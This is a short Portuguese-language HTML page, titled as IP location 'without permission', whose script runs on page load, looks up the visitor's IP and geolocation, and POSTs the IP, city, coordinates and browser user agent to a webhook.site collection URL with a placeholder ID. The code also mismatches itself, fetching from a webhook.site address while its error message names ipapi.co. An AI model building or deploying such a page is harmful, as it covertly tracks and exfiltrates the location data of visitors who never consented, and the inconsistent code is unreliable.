<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Localização por IP</title>
  <style>body{font-family:Arial,Helvetica,sans-serif;margin:30px}pre{white-space:pre-wrap}</style>
</head>
<body>
  <h1>Localização por IP (sem permissão)</h1>
  <p id="status">Aguardando...</p>
  <pre id="json" style="display:none"></pre>

  <script>
    (async () => {
      const status = document.getElementById('status');
      const pre = document.getElementById('json');
      try {
        status.textContent = 'Consultando IP e localização...';
        const r = await fetch('https://webhook.site/c4a3b066-2515-4d6b-825f-f09ed7858c7f');
        if (!r.ok) throw new Error('Falha ao consultar ipapi.co: ' + r.status);
        const info = await r.json();
        status.textContent = `IP: ${info.ip} — ${info.city || ''} ${info.region || ''} ${info.country_name || ''} (lat:${info.latitude} lon:${info.longitude})`;
        pre.style.display = 'block';
        pre.textContent = JSON.stringify(info, null, 2);

        // envia ao webhook
        const webhook = 'https://webhook.site/SEU_ID_AQUI'; // <-- troque aqui
        await fetch(webhook, {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({ timestamp: new Date().toISOString(), ipapi: info, ua: navigator.userAgent })
        });

        console.log('Enviado ao webhook.');
      } catch (e) {
        status.textContent = 'Erro: ' + e.message;
        console.error(e);
      }
    })();
  </script>
</body>
</html>
